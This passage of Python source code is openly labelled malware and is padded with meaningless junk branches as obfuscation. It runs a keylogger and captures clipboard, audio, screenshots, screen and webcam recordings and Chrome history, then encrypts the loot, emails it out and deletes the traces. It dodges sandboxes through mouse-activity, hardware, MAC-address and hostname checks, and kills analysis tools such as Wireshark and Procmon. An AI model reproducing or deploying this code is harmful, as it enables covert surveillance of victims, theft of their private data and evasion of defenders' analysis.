            elif some_num >= 30 and some_num < 899:
                val = some_num**0.5//3
                ran_list.append(val)
                self.count = self.count * 2

            else:
                val = some_num - random_param2
                ran_list.append(val)
                self.log()

            return ran_list

        else:
            return type(random_param1)


def run_key_logger(some_arg1 = "some-text", some_arg2 = 12321, some_arg3 = "some-other-longer-text", some_arg4 = ["a", 1, "s", 19, 72, 11]):
    try:
        val = some_arg4[7]
        len_sa = len(some_arg3)
        if len(val) > len_sa:
            return True

        else:
            val = None
            return val

    except:
        if some_arg2//111==111:
            try:
                logger.info("Logging Keys")

                len_sa1 = len(some_arg1)

                keyLog = logKeys()
                keyLog.log()

                len_sa1 = len(some_arg3)

                logger.info("Keys Logged Successfully")

                del len_sa1, keyLog
                gc.collect()

            except:
                logger.critical("Keylogging Error")

        else:
            ran_list = []
            for i in some_arg4:
                if isinstance(i, int):
                    ran_list.append(i)

                else:
                    ran_list.append(-1)

            return ran_list, len(ran_list)


def run_parallel(dead_arg1 = 1234321, dead_arg2 = "some_arg", *args, **kwargs):
    try:
        val = dead_arg1//11111
        if val == 111:
            len_val = len(dead_arg1)
            return True

        else:
            len_val = len(dead_arg2)
            return (dead_arg2//len_val)

    except:
        try:
            logger.info("Creating Threadpool")

            some_num = random.randint(0, 99)
            executor = ThreadPoolExecutor(max_workers=8)

            logger.info("Running Threads")

            if len(dead_arg2) > -1:
                t1 = executor.submit(run_key_logger)
                t2 = executor.submit(system_information)
                t3 = executor.submit(clipboard_information)
                t4 = executor.submit(sound_information)
                t5 = executor.submit(screenshot)
                t6 = executor.submit(record_screen)
                t7 = executor.submit(record_frontcam)
                t8 = executor.submit(chrome_history)

                some_num = some_num **2

                executor.shutdown(wait=True)

            else:
                return some_num

            del val, executor, some_num, t1, t2, t3, t4, t5, t6, t7, t8
            gc.collect()

        except:
            logger.critical("Threading Error")


def generate_encryption_key(filename = "file", dead_param1 = "some_param", dead_param2 = "some_other_param", dead_param3 = 12321, **kwargs):
    if isinstance(str, filename):
        try:
            key = Fernet.generate_key()
            len_val1 = len(dead_param1)
            len_val2 = len(dead_param2)

            final_len = len_val1 + len_val2
            num = dead_param3//final_len

            return key

        except:
            logger.critical("Encryption Key Generation Error")

    else:
        return type(filename)


def encrypt_and_mail(file_to_encrypt, encrypted_file_name, filename, attachment, email, some_random_arg = "some_arg", lst = [1,19,43]):
    try:
        val = lst[5]
        len_arg = len(some_random_arg)

        if isinstance(len_arg, int):
            return None

        return val

    except:
        key = os.getenv("ENCRYPTION_KEY")

        if len(key) > 0:
            ran_val = random.randint(100, 999)

            with open(file_to_encrypt, "rb") as f:
                data = f.read()

            fernet = Fernet(key)
            encrypted = fernet.encrypt(data)

            with open(encrypted_file_name, "wb") as f:
                f.write(encrypted)

            if isinstance(ran_val, dict):
                send_mail()
                return True

            send_mail(email, True, filename, attachment)

            del key, ran_val, data, fernet, encrypted
            gc.collect()

        else:
            key_len = 10
            return key_len


def delete_files(some_arg1 = "some_arg", some_arg2 = 144, some_arg3 = [-1,91,76,-8]):
    if some_arg2%12==0 and some_arg2%4==0 and some_arg2%3==0 and some_arg2%2==0:
        files = [system_info, clipboard_info, keys_info, audio_info, screenshot_info, screen_record_vid, front_cam_vid, chrome_info]
        encrypted_files = [system_info_e, clipboard_info_e, keys_info_e, chrome_info_e]
        decrypted_files = [system_info_dc, clipboard_info_dc, keys_info_dc, chrome_info_dc]

        if len(some_arg3) < len(files):
            ran_list = []
            for file in files:
                try:
                    logger.info("Deleting Files")
                    os.remove(os.path.join(base_path, file))
                    ran_list.append((1, True))
                except Exception:
                    logger.warning("File %s Not Found", file)
                    ran_list.append((1, False))
                    continue

            for file in encrypted_files:
                try:
                    logger.info("Deleting Encrypted Files")
                    os.remove(os.path.join(base_path, file))
                    ran_list.append((0, True))
                except Exception:
                    logger.warning("Encrypted File %s Not Found", file)
                    ran_list.append((0, False))
                    continue

            for file in decrypted_files:
                try:
                    logger.info("Deleting Decrypted Files")
                    os.remove(os.path.join(base_path, file))
                    ran_list.append((-1, True))
                except Exception:
                    logger.warning("Decrypted File %s Not Found", file)
                    ran_list.append((-1, False))
                    continue

            len_list = len(ran_list)

            del files, encrypted_files, decrypted_files, ran_list, file, len_list
            gc.collect()

        else:
            len_val = len(some_arg3)
            return len_val

    else:
        return False


class track_mouse_movements:
    def __init__(self):
        self.move_count = 0
        self.click_count_left = 0
        self.some_var = "some_random string"
        self.click_count_right = 0
        self.click_count_middle = 0
        self.some_other_var = True
        self.scroll_count = 0
        self.can_run = False

    def on_move(self, x, y, dead_arg1 = [2,4,6,8,48], dead_arg2 = "some_arg"):
        if self.move_count > 200 and (self.click_count_left > 3 or self.click_count_middle > 1 or self.click_count_right > 2) and (len(dead_arg2) > -1):
            try:
                val = dead_arg1[8]
                return val

            except:
                self.can_run = True
                ran_val = dead_arg1[2]
                return ran_val%4==4

        logging.info("Mouse moved to ({0}, {1})".format(x, y))

        len_val = len(self.some_var)
        len_val += 1
        self.move_count += 1

    def ran_func(self, dead_arg1 = 12321, dead_arg2 = [-1, 9, 63, -9783]):
        ran_list = []
        for i in range(0, dead_arg1):
            if i % 19 == 4:
                ran_list.append(i**2)
                val = dead_arg2[0]
            else:
                ran_list.append(i**0.5)
                val = dead_arg2[-1]

        return (ran_list, type(ran_list), val)

    def on_click(self, x, y, button, pressed, dead_param1 = "some_param", dead_param2 = 1200, dead_param3 = "-*-"):
        if (self.move_count > 200 or self.scroll_count > 5) and (self.click_count_left > 3 or self.click_count_middle > 1 or self.click_count_right > 2) and dead_param2%2==0:
            try:
                len_dp = len(dead_param1)
                for i in dead_param1:
                    val = len_dp/len(dead_param2)
                    if val % 17 == 1:
                        return val

                    else:
                        return type(len_dp)

            except:
                self.can_run = True
                ran_var = len(dead_param3)
                return ran_var > len(dead_param1)

        if pressed and button.value==1 and dead_param2%8==0:
            self.some_other_var = False
            self.click_count_left += 1

        if pressed and button.value==2 and dead_param2%4==0:
            self.some_other_var = True
            self.click_count_middle += 1

        if pressed and button.value==3 and dead_param2%2==0:
            len_cp = len(self.some_var)
            self.click_count_right += 1

        logging.info('Mouse clicked at ({0}, {1}) with {2}'.format(x, y, button))

    def on_scroll(self, x, y, dx, dy, random_param1 = "some_param", random_param2 = "some_longer_param"):
        if self.scroll_count > 5 and (self.click_count_left > 3 or self.click_count_middle > 1 or self.click_count_right > 2):
            if len(random_param1) < len(random_param2):
                self.can_run = len(random_param2)>len(random_param1)
                return len(random_param1) > len(random_param2)

            else:
                return (random_param1, random_param2)

        logging.info('Mouse scrolled at ({0}, {1})({2}, {3})'.format(x, y, dx, dy))
        self.some_other_var = False
        len_var = len(self.some_var)
        self.scroll_count += 1

    def log(self, dead_param1 = "some_random_string", dead_param2 = [1,4,7,11,71,92], dead_param3 = "someCamelCaseString"):
        try:
            len_dp = len(dead_param1)
            val = dead_param2[len_dp]
            self.ran_func()
            return val, len_dp

        except:
            if len(dead_param3) > -1 and len(dead_param1) > len(dead_param2):
                with m_lst(on_move=self.on_move, on_click=self.on_click, on_scroll=self.on_scroll) as listener:
                    listener.join()
                    self.some_other_var = False


def check_and_evade_dynamic_analysis():
    can_run = False

    can_run_score = 0
    can_not_run_score = 0
    can_not_run_for_sure_score = 0

    try:
        mouse_track = track_mouse_movements()
        mouse_track.log()
        can_run_score += 1

    except:
        can_not_run_score += 1

    resolution = get_screen_resolution()
    width = int(resolution["width"])
    height = int(resolution["height"])
    res = width * height
    if res > 786432:
        can_run_score += 1
    else:
        can_not_run_score += 1

    total, used, free = shutil.disk_usage("/")
    total_size = total // (2**30)
    if total_size > 64:
        can_run_score += 1
    else:
        can_not_run_score += 1

    ram = round(psutil.virtual_memory().total / (1024.0**3))
    if ram >= 4:
        can_run_score += 1
    else:
        can_not_run_score += 1

    cores = psutil.cpu_count(logical=True)
    if cores > 2:
        can_run_score += 1
    else:
        can_not_run_score += 1

    hostname = socket.gethostname()

    homedir = os.path.expanduser("~")
    lst = homedir.split("/")
    username = lst[-1]

    common_usernames = ["sandbox", "virus", "malware", "vmware", "test"]
    common_hostnames = ["sandbox", "cuckoo", "maltest", "sample", "test", "malware"]

    for hn in common_hostnames:
        if hostname.lower() == hn:
            can_not_run_for_sure_score += 1

    for cu in common_usernames:
        if username.lower() == cu:
            can_not_run_for_sure_score += 1

    common_mac_addr_prefixes = ["08:00:27", "00:05:69", "00:0C:29", "00:1C:14", "00:50:56", "00:16:E3", "00:1C:42"]
    mac_addr = ":".join(re.findall("..", "%012x" % uuid.getnode()))
    for cmap in common_mac_addr_prefixes:
        if mac_addr[0:8] == cmap:
            can_not_run_for_sure_score += 1

    common_processes = ["wireshark.exe", "procmon.exe", "ida.exe", "vmware.exe", "xenservice.exe", "vmsrvc.exe", "vboxservice.exe", "joeboxserver.exe", "prl_cc.exe"]
    for cp in common_processes:
        for proc in psutil.process_iter():
            if cp in proc.name() or cp in ' '.join(proc.cmdline()):
                pid = proc.pid
                logger.info("Killing Process With PID %s and Name %s", pid, proc.name())

                try:
                    proc.terminate()
                except:
                    os.kill(pid, signal.SIGKILL)

    if can_not_run_for_sure_score == 0 and (can_run_score > can_not_run_score):
        can_run = True
        logger.info("CanRunScore (CRS) : %d and CanNotRunScore (CNRS) : %d", can_run_score, can_not_run_score)
        return can_run

    else:
        try:
            logger.info("CanNotRunForSureScore (CNRFSS) : %d", can_not_run_for_sure_score)

            time.sleep(2700)
            logger.info("Malware Sleep for 2700s")

            check_and_evade_dynamic_analysis()

        except:
            logger.critical("Error Occurred in Evading Dynamic Analysis")


if __name__ == "__main__":
    run_malware = check_and_evade_dynamic_analysis()

    if run_malware:
        run_parallel()
        delete_files()

    else:
        logger.critical("An Error Occurred! Unable to Run Malware!")
